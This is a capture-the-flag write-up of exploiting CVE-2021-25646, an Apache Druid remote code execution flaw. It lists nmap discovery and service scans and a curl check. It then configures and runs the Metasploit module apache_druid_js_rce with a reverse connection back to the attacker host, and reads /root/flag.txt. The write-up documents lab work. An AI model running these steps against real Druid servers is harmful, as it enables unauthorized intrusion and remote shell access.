# Vulnerability Exploitation Report: CVE-2021-25646

## Vulnerability Overview
**CVE ID**: CVE-2021-25646  
**CVSS Score**: 9.0 (Critical)  
**Description**: Apache Druid, a high-performance analytics database, is vulnerable to remote code execution (RCE) due to insufficient input validation in its JavaScript ingestion feature. This flaw allows unauthenticated attackers to execute arbitrary code on the target server.

## Objective
Exploit the CVD-2021-25646 vulnerability on a target Apache Druid instance to gain unauthorized access and retrieve the `/root/flag.txt` file as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.6
- **Target Port**: 8888 (Apache Druid default port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.6) to confirm the presence of Apache Druid.

```
nmap -sV 192.168.5.6
```

### Step 3: Verify Apache Druid Accessibility
Confirm the Apache Druid instance is accessible by sending an HTTP request to port 8888.

```
curl -L http://192.168.5.6:8888
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 5: Search for Apache Druid Exploit
Search Metasploit for modules related to Apache Druid vulnerabilities.

```
search apache druid
```

### Step 6: Select Apache Druid RCE Module
Choose the Metasploit module for the Apache Druid JavaScript RCE vulnerability.

```
use exploit/linux/http/apache_druid_js_rce
```

### Step 7: Review Module Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 8: Configure the Target Host
Set the target host to the Apache Druid instanceâ€™s IP address.

```
set RHOSTS 192.168.5.6
```

### Step 9: Configure the Local Host
Set the local host IP for the reverse connection.

```
set LHOST 192.168.0.5
```

### Step 10: Execute the Exploit
Run the exploit to achieve remote code execution on the target system.

```
exploit
```

### Step 11: Retrieve the Flag
Read the contents of the `flag.txt` file in the `/root` directory.

```
cat /root/flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: WVJlAl0uRKyflXWJ